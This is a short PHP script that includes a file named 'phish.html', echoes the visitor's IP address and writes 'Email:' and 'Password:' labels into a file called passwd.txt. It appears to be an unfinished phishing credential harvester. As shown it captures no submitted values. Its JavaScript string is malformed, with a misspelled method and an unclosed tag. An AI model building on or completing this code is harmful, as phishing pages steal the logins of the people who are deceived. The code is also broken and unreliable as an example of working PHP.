<?php
require("phish.html");
$IP = $_SERVER['REMOTE_ADDR'];

echo "$IP is your IP address!";
$email = "<script>document.getElementByID(\"email\").innerHTML = 'textbox';";
$myfile = fopen("passwd.txt", "w") or die("Unable to open file!");
$txt = "Email: \n";
fwrite($myfile, $txt);
$txt = "Password: \n";
fwrite($myfile, $txt);
fclose($myfile);
?>